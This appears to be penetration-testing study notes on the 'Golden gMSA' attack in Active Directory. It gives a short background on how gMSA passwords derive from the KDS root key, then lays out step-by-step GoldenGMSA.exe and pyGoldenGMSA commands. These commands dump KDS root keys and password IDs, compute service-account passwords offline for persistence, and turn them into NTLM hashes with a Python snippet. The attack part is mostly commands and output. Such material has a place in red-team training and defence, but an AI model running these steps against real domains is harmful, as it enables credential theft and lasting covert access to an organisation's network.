
* Tool: https://github.com/Semperis/GoldenGMSA
* Some nice presentation: https://download.scrt.ch/insomnihack/ins24-slides/Insomnihack%202024%20-%20Burn%20it%20burn%20it%20all.pdf

## Background

The passwords associated with gMSAs are generated using inputs that cannot be rotated if compromised, allowing attackers with high privileges to dump KDS root keys and generate the passwords of the associated gMSAs offline for as long as they exist.

Normal password derivation flow for gMSA server:

```bash

Server (authorized to use gMSA)          Domain Controller
          │                                      │
          │─── RPC GetKey (MS-GKDI) ────────────▶│
          │  (sends gMSA SID + current time)     │
          │                                      │
          │◀─────── Group Key Envelope (GKE) ───│
          │                                      │
          │─── kdscli!_GenerateGmsaPassword ────▶│ (internal)
          │                                      │
          │◀─────── Current plaintext password ──│
```

Key calculation flow Inside the DC:

- Takes the **KDS root key** (static master secret).
- Takes the **gMSA's SID**.
- Takes the **current timestamp** → converts it into three integers: **L0KeyID**, **L1KeyID**, **L2KeyID**.
- Runs a cryptographic derivation (using KDF algorithms specified in the root key).
- Returns the password for that exact time slot back to the **requesting Server**.

So actually master secret is never changed but use for derivation of future service keys like so:
**K_sid = K_kds(Time_Stampt, gMSA_SID)**

So the crypto is known and if KDS master key is known then the service key can be easily derived **without contacting the DC**!
## Workflow

**For this attack to work we need KDS key attributes.**

The attributes are `replicated` to `Child Domain Controllers` as part of the `Configuration NC`. So, if we have compromised a chile DC and got SYSTEM, then we can query the child DCs local replica to obtain KDS attributes.

### Local

#### Online (first time retrieval)

Get the master secret:

```bash
# PLEASE be SYSTEM
nt authority\system

.\GoldenGMSA.exe gmsainfo -d domain.local

 .\GoldenGMSA.exe compute --sid  S-1-5-21-2879935 ... --forest dev.domain.local --domain domain.local

Base64 Encoded Password:        P3...
```

Decode the master secret: 

```python
# pip install pycryptodome

from Crypto.Hash import MD4
import base64

base64_master_secret  = "P3..."

print(MD4.new(base64.b64decode(base64_master_secret)).hexdigest())
```


#### Offline (persistence)

```bash
C:\Tools\> .\PsExec -s -i powershell

# msds-ManagedPasswordID

.\GoldenGMSA.exe gmsainfo --domain domain.local 
ManagedPasswordID: AQAAAEtEU0sCAAAAaQEA....

#kdsinfo


.\GoldenGMSA.exe kdsinfo --forest dev.domain.local 

Base64 blob:    AQAAAAwsk7o0....                                                 

#compute the gMSA password using the above components

.\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145..." --kdskey AQAAAAws.... --pwdid AQAAAEtEU0sCAAA....

Encoded Password:  WITSKRtGah...
```

Use the python code from ONLINE part to compute the MD4 hash ftw.

### Remote

Download: https://github.com/felixbillieres/pyGoldenGMSA.git

#### Online Computation

**Attention: sends query to DC and can be detected!!! - retrieves KDS root key and password ID from the DC** 

1. Get the specific SID you need for computing password:

```bash

proxychains -q python3 main.py -u "Administrator@dev.domain.local" -p 'pass!' -d inlanefreight.ad --dc-ip 172.16.xxx.xxx gmsainfo

[...]
objectSid:         S-1-5-21-2879935145-...
[...]
```

2. Request the key:

```bash

python3 main.py -u "Administrator@dev.domain.local" -p 'pass!' -d inlanefreight.ad --dc-ip 172.16.xxx.xxx compute --sid $objectSid

```


#### Offline Computation

1. Get the pwdid and sid

```bash

python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo

```

2. Get kdsinfo

```bash

python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP kdsinfo

```

3. Calculate the key

```bash

python3 main.py compute --sid $objectSid --kdskey "...<base64>..." --pwdid "...<base64>..."

```
